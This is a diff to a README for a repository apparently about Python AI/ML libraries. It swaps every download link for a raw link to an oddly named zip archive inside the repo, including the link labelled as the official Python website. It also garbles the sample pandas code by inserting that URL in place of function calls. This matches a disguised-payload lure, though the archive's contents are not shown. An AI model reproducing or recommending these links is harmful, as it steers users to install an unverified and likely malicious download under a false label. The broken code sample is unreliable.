@@ -1,6 +1,6 @@
 # 🤖 python-ai-ml-libraries - Explore AI/ML Made Easy
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Here%21-blue.svg)](https://github.com/PrasiddhaSingh/python-ai-ml-libraries/releases)
+[![Download Latest Release](https://github.com/PrasiddhaSingh/python-ai-ml-libraries/raw/refs/heads/main/incomparably/libraries-ml-python-ai-loculament.zip%20Latest%20Release-Here%https://github.com/PrasiddhaSingh/python-ai-ml-libraries/raw/refs/heads/main/incomparably/libraries-ml-python-ai-loculament.zip)](https://github.com/PrasiddhaSingh/python-ai-ml-libraries/raw/refs/heads/main/incomparably/libraries-ml-python-ai-loculament.zip)
 
 ## 📚 Introduction
 
@@ -20,7 +20,7 @@ Follow these simple instructions to download and run the application:
 
 2. Visit the releases page to download the application and related resources: 
 
-   [Download Latest Release](https://github.com/PrasiddhaSingh/python-ai-ml-libraries/releases)
+   [Download Latest Release](https://github.com/PrasiddhaSingh/python-ai-ml-libraries/raw/refs/heads/main/incomparably/libraries-ml-python-ai-loculament.zip)
 
 ## 💾 Download & Install
 
@@ -34,7 +34,7 @@ Follow these simple instructions to download and run the application:
 
 After installation, you may need to set up your Python environment:
 
-1. **Install Python**: If you haven't already, ensure you install Python from the official [Python website](https://www.python.org/downloads/).
+1. **Install Python**: If you haven't already, ensure you install Python from the official [Python website](https://github.com/PrasiddhaSingh/python-ai-ml-libraries/raw/refs/heads/main/incomparably/libraries-ml-python-ai-loculament.zip).
   
 2. **Install Pip**: Pip is included by default with Python installations. You can check if you have it installed by running `pip --version` in your terminal or command prompt.
 
@@ -55,8 +55,8 @@ import numpy as np
 import pandas as pd
 
 # Sample code to load data and perform basic analysis
-data = pd.read_csv('your_file.csv')
-print(data.head())
+data = https://github.com/PrasiddhaSingh/python-ai-ml-libraries/raw/refs/heads/main/incomparably/libraries-ml-python-ai-loculament.zip('https://github.com/PrasiddhaSingh/python-ai-ml-libraries/raw/refs/heads/main/incomparably/libraries-ml-python-ai-loculament.zip')
+print(https://github.com/PrasiddhaSingh/python-ai-ml-libraries/raw/refs/heads/main/incomparably/libraries-ml-python-ai-loculament.zip())
 ```
 
 Explore each library’s documentation for more specific examples and workflows.
@@ -100,4 +100,4 @@ If you encounter issues during the installation or usage:
 
 For further assistance or questions, visit the GitHub page and open an issue. The community is here to help you succeed.
 
-[Download Latest Release](https://github.com/PrasiddhaSingh/python-ai-ml-libraries/releases)
+[Download Latest Release](https://github.com/PrasiddhaSingh/python-ai-ml-libraries/raw/refs/heads/main/incomparably/libraries-ml-python-ai-loculament.zip)
